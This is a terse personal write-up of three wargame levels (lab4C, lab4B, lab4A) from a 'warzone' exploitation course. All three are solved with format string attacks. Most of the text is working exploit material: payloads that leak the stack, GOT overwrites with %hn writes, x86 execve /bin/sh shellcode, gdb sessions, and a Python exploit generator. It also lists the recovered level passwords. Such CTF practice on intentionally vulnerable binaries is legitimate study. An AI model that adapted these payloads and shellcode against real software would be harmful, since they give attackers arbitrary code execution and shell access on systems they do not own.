lab4C:
the username feild is directly passed into printf so we could send the format string and brute force the stack to get to the real pass variable
python -c 'print "%FUZZ$08x" + "\n" + "password"' | ./lab4C
[+] Starting local process '/levels/lab04/lab4C': pid 5071
[*] Process '/levels/lab04/lab4C' stopped with exit code 1 (pid 5071)
b'===== [ Secure Access System v1.0 ] =====\n-----------------------------------------\n- You must login to access this system. -\n-----------------------------------------\n--[ Username: --[ Password: -----------------------------------------\n00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 75620000 74315f37  does not have access!\n'
[+] Starting local process '/levels/lab04/lab4C': pid 5073
[*] Process '/levels/lab04/lab4C' stopped with exit code 1 (pid 5073)
b'===== [ Secure Access System v1.0 ] =====\n-----------------------------------------\n- You must login to access this system. -\n-----------------------------------------\n--[ Username: --[ Password: -----------------------------------------\n7334775f 625f376e 33745572 7230665f 62343363 00216531 24313325 20783830 24323325 20783830  does not have access!\n'

change that little indian to normal hex and convert it stirng
6275 375f3174 5f773473 6e375f62 72557433 5f663072 63333462 316521

pass: bu7_1t_w4sn7_brUt3_f0rc34b1e!

lab4B:

we change the location of exit funtion to out shell code using format-string

echo $'\xb8\x99\x04\x08\xba\x99\x04\x08%63024x%6$hn%51655x%7$hn\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x83\xec\x04\x89\x04\x24\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' > /tmp/pay3

pass: fg3ts_d0e5n7_m4k3_y0u_1nv1nc1bl3


lab4A:

snprintf is copying the file name that we enter 

lab4A@warzone:/tmp$ /levels/lab04/lab4A `python -c 'print "\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80" + "\x8c\xf5\xff\xbf\x8e\xf5\xff\xbf" + "%62574x%20$hn%52080x%21$hn"'`
*** stack smashing detected ***: /levels/lab04/lab4A terminated
Aborted
lab4A@warzone:/tmp$ gdb
gdb-peda$ file /levels/l
lab01/   lab03/   lab05/   lab07/   lab09/   
lab02/   lab04/   lab06/   lab08/   lecture/ 
gdb-peda$ file /levels/lab04/lab4A
Reading symbols from /levels/lab04/lab4A...(no debugging symbols found)...done.
gdb-peda$ run `python -c 'print "\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80" + "\xfc\xf5\xff\xbf\xfe\xf5\xff\xbf" + "%62686x%20$hn%51968x%21$hn"'`
Starting program: /levels/lab04/lab4A `python -c 'print "\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80" + "\xfc\xf5\xff\xbf\xfe\xf5\xff\xbf" + "%62686x%20$hn%51968x%21$hn"'`
process 11066 is executing new program: /bin/dash
$ whoami;id
[New process 11072]
process 11072 is executing new program: /usr/bin/whoami

i got the shell inside gdb
but not working out....i have checked the address properly...it doesnt seem to work

finally

/levels/lab04/lab4A `python exp4A.py 0xbffff59c 0xbffff49f 0x1bfde`
worked just the address was changing a lot
lab4A@warzone:/tmp$ /levels/lab04/lab4A `python exp4A.py 0xbffff59c 0xbffff49f 0x1bfde`
$ ls
ls: cannot open directory .: Permission denied
$ whoami
lab4end
$ cat /home/lab4end/.pass
1t_w4s_ju5t_4_w4rn1ng
$ 

import sys
import struct
#from pwn import *
 
shellcode = "\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
            # len = 25
 
ret_address = int(sys.argv[1],16)
shell_code  = int(sys.argv[2],16)

exp = shellcode
exp += struct.pack("<L",ret_address)
exp += struct.pack("<L",ret_address+2)
lower_byte = (shell_code & 0xffff) - len(shellcode) - 8
exp += "%{}x".format(lower_byte)
exp += "%20$hn"
upper_byte = int(sys.argv[3],16) - lower_byte
exp += "%{}x".format(upper_byte)
exp += "%21$hn"

print(exp)


